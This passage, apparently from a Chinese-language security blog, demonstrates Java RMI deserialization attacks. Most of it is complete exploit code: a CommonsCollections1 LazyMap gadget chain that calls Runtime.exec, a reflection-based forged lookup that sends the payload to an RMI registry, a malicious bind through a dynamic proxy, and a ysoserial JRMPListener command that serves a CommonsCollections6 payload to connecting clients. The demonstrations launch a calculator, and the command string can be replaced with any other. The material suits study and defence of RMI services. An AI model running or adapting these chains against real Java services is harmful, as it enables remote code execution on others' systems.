class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (Map) LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line"><span class="comment">//        lazyMap.get(&quot;Jasper&quot;);</span></span><br><span class="line">        Class&lt;?&gt; aihClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihConstuctor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        aihConstuctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">aih</span> <span class="operator">=</span> (InvocationHandler) aihConstuctor.newInstance(Override.class,lazyMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(),aih);</span><br><span class="line"></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">aih2</span> <span class="operator">=</span> (InvocationHandler) aihConstuctor.newInstance(Override.class,lazyMapProxy);</span><br><span class="line">        <span class="keyword">return</span> aih2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException, MalformedURLException, AlreadyBoundException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Remote Server start...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.create registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.generate remote object</span></span><br><span class="line">        <span class="type">RemoteObjectInterface</span> <span class="variable">remoteObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3.bind the remote object to the registry</span></span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObject&quot;</span>, remoteObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteObjectInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">vulFunc</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.Operation;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteCall;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 1. get the stub of registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// 2. get the stub of remote object</span></span><br><span class="line">        <span class="type">RemoteObjectInterface</span> <span class="variable">stub</span> <span class="operator">=</span> (RemoteObjectInterface) registry.lookup(<span class="string">&quot;remoteObject&quot;</span>);</span><br><span class="line">        <span class="comment">// 3. invoke the method of remote object</span></span><br><span class="line">        stub.vulFunc();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先运行Server端的启动代码，再运行Client端的启动代码，成功执行CC1命令。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695110240928-9e8ce206-fae1-4f79-8d0a-8305d8f35eb6.png" alt="image.png"></p><h2 id="客户端攻击注册中心"><a href="#客户端攻击注册中心" class="headerlink" title="客户端攻击注册中心"></a>客户端攻击注册中心</h2><p>攻击原理：客户端主要是lookup和unbind，这两个函数接收一个客户端传过来的String类型的参数，然后去查找对应的绑定的远程对象是否存在，但是实际上，<strong>注册中心是先把传过来的String类型参数反序列化，再进行类型转换的</strong>，在类型转换之前反序列化攻击就可以完成，那么我们如果lookup传一个恶意对象，注册中心就会反序列化RCE。<br><strong>详情见：注册中心收到查询请求并返回远程对象的代理</strong><br>需要注意的是，lookup方法本身并不支持传输一个恶意对象，所以需要我们自己实现封装一个lookup方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteObjectInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteObjectImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteObjectInterface</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RemoteObjectImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">upS</span> <span class="operator">=</span> s.toUpperCase();</span><br><span class="line">        System.out.println(upS);</span><br><span class="line">        <span class="keyword">return</span> upS;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Remote Server start...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.create registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.generate remote object</span></span><br><span class="line">        <span class="type">RemoteObjectInterface</span> <span class="variable">remoteObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3.bind the remote object to the registry</span></span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObject&quot;</span>, remoteObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteObjectInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 1. get the stub of registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// 2. get the stub of remote object</span></span><br><span class="line"><span class="comment">//        RemoteObjectInterface stub = (RemoteObjectInterface) registry.lookup(&quot;remoteObject&quot;);</span></span><br><span class="line">        fakeLookup(registry);</span><br><span class="line">        <span class="comment">// 3. invoke the method of remote object</span></span><br><span class="line"><span class="comment">//        stub.sayHello(&quot;I&#x27;m jasper you motherfucker.&quot;);</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getCCPayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//CC1-LazyMap</span></span><br><span class="line">        Transformer[] transformers =  <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;Calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (Map) LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line"><span class="comment">//        lazyMap.get(&quot;Jasper&quot;);</span></span><br><span class="line">        Class&lt;?&gt; aihClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihConstuctor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        aihConstuctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">aih</span> <span class="operator">=</span> (InvocationHandler) aihConstuctor.newInstance(Override.class,lazyMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(),aih);</span><br><span class="line"></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">aih2</span> <span class="operator">=</span> (InvocationHandler) aihConstuctor.newInstance(Override.class,lazyMapProxy);</span><br><span class="line">        <span class="keyword">return</span> aih2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">fakeLookup</span><span class="params">(Registry registry)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 获取ref</span></span><br><span class="line">        Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();</span><br><span class="line">        fields_0[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> (UnicastRef) fields_0[<span class="number">0</span>].get(registry);</span><br><span class="line">        <span class="comment">//获取operations</span></span><br><span class="line"></span><br><span class="line">        Field[] fields_1 = registry.getClass().getDeclaredFields();</span><br><span class="line">        fields_1[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Operation[] operations = (Operation[]) fields_1[<span class="number">0</span>].get(registry);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 伪造lookup的代码，去伪造传输信息</span></span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> ref.newCall((RemoteObject) registry, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">        <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">        var3.writeObject(getCCPayload());</span><br><span class="line">        ref.invoke(var2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>先运行Server端启动代码，再运行Client端启动代码模仿lookup操作，成功执行CC1。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695114761061-efae3aa5-7dbd-4c64-9913-8929f3143f44.png" alt="image.png"></p><h2 id="服务端攻击注册中心"><a href="#服务端攻击注册中心" class="headerlink" title="服务端攻击注册中心"></a>服务端攻击注册中心</h2><p>攻击原理：和客户端差不多，服务端主要使用bind函数把远程对象序列化的方式传给注册中心，注册中心通过网络连接对其反序列化，那么如果服务端bind的时候传一个恶意对象，就会导致注册中心反序列化触发RCE。<br><strong>详情见：注册中心接受并处理服务端绑定请求</strong><br>这里还有个问题，bind函数的参数要求是Remote类型的，而我们CC链构造的是Object类型的，这里我们用到的是动态代理，把恶意对象封装成Remote类型的动态代理对象传进去。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Remote Server start...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.create registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.generate remote object</span></span><br><span class="line">        <span class="comment">// dynamic proxy cast to Remote type</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">evilObject</span> <span class="operator">=</span> getCCPayload();</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">remoteObject</span> <span class="operator">=</span> Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Remote.class &#125;, (InvocationHandler) evilObject));</span><br><span class="line">        <span class="comment">// 3.bind the remote object to the registry</span></span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObject&quot;</span>, remoteObject);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getCCPayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//CC1-LazyMap</span></span><br><span class="line">        Transformer[] transformers =  <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;Calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (Map) LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line"><span class="comment">//        lazyMap.get(&quot;Jasper&quot;);</span></span><br><span class="line">        Class&lt;?&gt; aihClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihConstuctor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        aihConstuctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">aih</span> <span class="operator">=</span> (InvocationHandler) aihConstuctor.newInstance(Override.class,lazyMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(),aih);</span><br><span class="line"></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">aih2</span> <span class="operator">=</span> (InvocationHandler) aihConstuctor.newInstance(Override.class,lazyMapProxy);</span><br><span class="line">        <span class="keyword">return</span> aih2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行Server端启动代码，成功执行CC1.<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695123613051-9d8de0bf-703c-45c5-a0bd-96412a54b762.png" alt="image.png"></p><h2 id="注册中心攻击客户-服务端"><a href="#注册中心攻击客户-服务端" class="headerlink" title="注册中心攻击客户&#x2F;服务端"></a>注册中心攻击客户&#x2F;服务端</h2><p>攻击原理：这里实际上是利用JRMP协议进行攻击，也就是RMI中的网络通信协议，它在建立连接的时候，注册中心会给请求连接的一端（Server&#x2F;Client）发送一些序列化的数据，然后请求连接的一段对其进行反序列化。<br>这就意味着，只要服务端或者客户端获取到 Registry，并且执行了list、unbind、lookup 、rebind、bind方法之一，自身就会被RCE。<br><strong>本质上其实是JRMP协议的服务端对JRMP协议的客户端的攻击。</strong><br>这里我们在终端，用ysoserial起一个恶意注册中心：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java <span class="literal">-cp</span> .\ysoserial<span class="literal">-all</span>.jar ysoserial.exploit.JRMPListener <span class="number">1099</span> CommonsCollections6 <span class="string">&#x27;calc&#x27;</span></span><br></pre></td></tr></table></figure><p>以Client端为例，让Client端获取到恶意注册中心的代理对象，同时执行lookup</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 1. get the stub of registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;10.202.12.129&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// 2. get the stub of remote object</span></span><br><span class="line">        <span class="type">RemoteObjectInterface</span> <span class="variable">stub</span> <span class="operator">=</span> (RemoteObjectInterface) registry.lookup(<span class="string">&quot;remoteObject&quot;</span>);</span><br><span class="line">        <span class="comment">// 3. invoke the method of remote object</span></span><br><span class="line">        <span class="comment">//        stub.sayHello(&quot;I&#x27;m jasper you motherfucker.&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>成功RCE，执行CC6并且弹出计算器<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695127453684-7e7aa852-5167-47aa-8919-b447b0bf46e1.png" alt="image.png"><br>服务端同理，不再演示。</p><h2 id="动态类加载"><a href="#动态类加载" class="headerlink" title="动态类加载"></a>动态类加载</h2><p>攻击原理：java.rmi.server.codebase简单来说就是远程的classpath，当RMI的流程出现本地加载不到类的时候，会选择从codebase去加载，也就是远程include代码，显然存在很大漏洞隐患，触发加载远程类有下面的情况：</p><ul><li>Server端函数的返回类型为接口定义类型的子类，Client端接收返回结果时找不到子类</li><li>Client端传参时传接口定义类型的子类，Server端接收参数时找不到子类</li></ul><p>注意：无论是客户端还是服务端要远程加载类，都需要满足以下条件：</p><ul><li>java.rmi.server.useCodebaseOnly 要设置为false，从JDK 6u45、7u21开始的默认值就是true</li><li>配置policy文件规则，允许从远程加载类库</li><li>配置RMISecurityManager</li></ul><h3 id="攻击Client端"><a href="#攻击Client端" class="headerlink" title="攻击Client端"></a>攻击Client端</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 